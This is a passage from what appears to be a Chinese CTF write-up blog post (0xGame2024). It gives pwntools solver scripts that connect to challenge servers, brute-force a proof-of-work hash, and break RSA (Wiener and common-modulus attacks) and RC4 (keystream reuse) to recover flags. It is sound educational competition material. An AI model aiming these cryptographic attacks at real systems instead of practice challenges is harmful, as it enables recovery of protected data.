<span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line"></span><br><span class="line">    d = wienerAttack(e, N)</span><br><span class="line">    ans = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solution3</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;input choice:\n&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;3\n&quot;</span>)</span><br><span class="line">    task = io.recvuntil(<span class="string">b&quot;\n&quot;</span>).decode()</span><br><span class="line">    (N, e, c, e_, c_) = ast.literal_eval(task)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 共模攻击</span></span><br><span class="line">    s0, s, s_ = gmpy2.gcdext(</span><br><span class="line">        e, e_</span><br><span class="line">    )  <span class="comment"># （具体来说，gmpy2.gcdext 函数返回三个值：最大公约数 s 以及满足等式 s = s1 * e1 + s2 * e2 的系数 s1 和 s2。）（e1*s1+e2*s2 = 1）</span></span><br><span class="line">    m = (<span class="built_in">pow</span>(c, s, N) * <span class="built_in">pow</span>(c_, s_, N)) % N</span><br><span class="line">    ans = <span class="built_in">str</span>(m).encode()</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof()  <span class="comment"># 交验证码</span></span><br><span class="line"></span><br><span class="line">solution0()</span><br><span class="line">solution1()</span><br><span class="line">solution2()</span><br><span class="line">solution3()</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>把密文和明文异或就能得到密钥流，拿到密钥流后再和flag的密文异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;118.195.138.159&#x27;</span> <span class="comment">#要netcat的ip</span></span><br><span class="line">port = <span class="number">10001</span> <span class="comment">#端口</span></span><br><span class="line">io = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;XXXX+&#x27;</span>)</span><br><span class="line">	proof = io.recvuntil(<span class="string">b&#x27;)&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">	<span class="built_in">hash</span> = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line">	<span class="built_in">dict</span> = ascii_letters + digits</span><br><span class="line">	<span class="keyword">for</span> word <span class="keyword">in</span> product(<span class="built_in">dict</span>, repeat=<span class="number">4</span>):</span><br><span class="line">		word = <span class="string">&#x27;&#x27;</span>.join(word).encode()</span><br><span class="line">		<span class="keyword">if</span> sha256( (word+proof) ).hexdigest() == <span class="built_in">hash</span>: <span class="keyword">break</span></span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>,word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	proof() <span class="comment">#交验证码</span></span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;Give me the text you want to encrypt:\n&#x27;</span>)</span><br><span class="line">	text=urandom(<span class="number">44</span>)<span class="comment">#加密后的flag长度为44字节</span></span><br><span class="line">	h=text.<span class="built_in">hex</span>()</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(h).encode())</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;c = &#x27;</span>)</span><br><span class="line">	enc_data=io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line">	enc_bytes=<span class="built_in">bytes</span>.fromhex(enc_data)</span><br><span class="line">	keystream=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc_bytes)):</span><br><span class="line">		keystream+=<span class="built_in">int</span>.to_bytes(enc_bytes[i]^text[i])<span class="comment">#还原密钥流</span></span><br><span class="line"></span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;c = &#x27;</span>)</span><br><span class="line">	enc_flag=io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line">	flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">	enc_flag_bytes=<span class="built_in">bytes</span>.fromhex(enc_flag)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc_flag_bytes)):</span><br><span class="line">		flag+=<span class="built_in">int</span>.to_bytes(enc_flag_bytes[i]^keystream[i])<span class="comment">#还原flag</span></span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="我叫曼波"><a href="#我叫曼波" class="headerlink" title="我叫曼波"></a>我叫曼波</h3><p>按encode.py文件逆向解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;47.98.178.117&#x27;</span> <span class="comment">#要netcat的ip</span></span><br><span class="line">port = <span class="number">1111</span> <span class="comment">#端口</span></span><br><span class="line">io = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_solution</span>():<span class="comment">#还原base64编码</span></span><br><span class="line">	key = <span class="number">0</span></span><br><span class="line">	hakimi_secret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	enc_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;Please input your choice and MANBO will make a series of corresponding behavioral responses.\n&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">		sign = (i % <span class="number">3</span>)  + <span class="number">1</span></span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(sign).encode())</span><br><span class="line">		<span class="keyword">if</span> sign == <span class="number">2</span>:</span><br><span class="line">			key = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()<span class="comment">#接收RC4秘钥</span></span><br><span class="line">			<span class="built_in">print</span>(key)</span><br><span class="line">		<span class="keyword">elif</span> sign == <span class="number">3</span>:</span><br><span class="line">			hakimi_secret = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()<span class="comment">#接收密文</span></span><br><span class="line">			enc_data = decode(hakimi_secret)</span><br><span class="line">			result += RC4_decrypt(enc_data, key)<span class="comment">#RC4解密</span></span><br><span class="line">		<span class="built_in">print</span>(result)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4_decrypt</span>(<span class="params">enc_data, K</span>):</span><br><span class="line">	S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">	T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">		S[i] = i</span><br><span class="line">		T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">		j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">		S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line">	</span><br><span class="line">	cipher = []</span><br><span class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> enc_data:</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">		j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">		S[i], S[j] = S[j], S[i]</span><br><span class="line">		t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">		k = S[t]</span><br><span class="line">		cipher.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">	<span class="keyword">return</span> ((<span class="string">&quot;&quot;</span>.join(cipher).encode())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">enc_text</span>):</span><br><span class="line">	encode_text = enc_text.replace(<span class="string">&quot;曼波&quot;</span>, <span class="string">&quot;0&quot;</span>).replace(<span class="string">&quot;哦耶&quot;</span>, <span class="string">&quot;1&quot;</span>).replace(<span class="string">&quot;哇嗷&quot;</span>, <span class="string">&quot;2&quot;</span>)<span class="comment">#还原为三进制字符串</span></span><br><span class="line">	ternary_str = encode_text</span><br><span class="line">	result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ternary_str)//<span class="number">5</span>):</span><br><span class="line">		tmp = ternary_str[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>]<span class="comment">#每段三进制字符串长度为5</span></span><br><span class="line">		decimal_number = <span class="built_in">int</span>(tmp, <span class="number">3</span>)<span class="comment">#三进制转为十进制</span></span><br><span class="line">		result += <span class="built_in">chr</span>(decimal_number)<span class="comment">#还原为ascii码</span></span><br><span class="line">	result = b64decode(result).decode()</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	decode_solution()</span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
        </article>
        <section class="post-near">
            <ul>
                
                    <li>上一篇: <a href="/2024/10/27/0xGame2024-week3/">0xGame2024 week3</a></li>
                
                
                    <li>下一篇: <a href="/2024/10/24/0xGame2024-week1/">0xGame2024 week1</a></li>
                
            </ul>
        </section>
        
            <section class="post-tags">
            <a class="-none-link" href="/tags/wp/" rel="tag">wp</a>
            </section>
        
    
        <section class="post-author">
        
            <figure class="author-avatar">
                <img src="https://gravatar.com/userimage/255640517/d60e38ce04bcad4f72b37aa8b3cb4727.jpeg?size=256" alt="N0tluS" />
            </figure>
        
            <div class="author-info">
                <h4>N0tluS</h4>
                <p>ovo</p>
            </div>
        </section>
    
    </div>
</main>

    <footer>
    <div class="buttons">
        <button class="to-top" href="#"></button>
    </div>
    <div class="wrap min">
        <section class="widget">
            <div class="row">
                <div class="col-m-4">
                    <h3 class="title-recent">最新文章：</h3>
                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/11/04/0xGame2024-week4/">0xGame2024 week4</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/31/Shiro-550%E5%88%86%E6%9E%90/">Shiro-550分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/27/0xGame2024-week3/">0xGame2024 week3</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week1/">0xGame2024 week1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/">Java反序列化之CB1</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-date">时光机：</h3>
                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-tags">标签云：</h3>
                    <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Java安全</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a>
                </div>
            </div>
        </section>
        <section class="sub-footer">
            <p>© 2024 <a href="/">N0tluS.site</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
        </section>
    </div>
</footer>


<script src="/static/kico.js"></script>
<script src="/static/hingle.js"></script>


<script>var hingle = new Paul_Hingle({"copyright":false,"night":true});</script>

  </body>
</html>
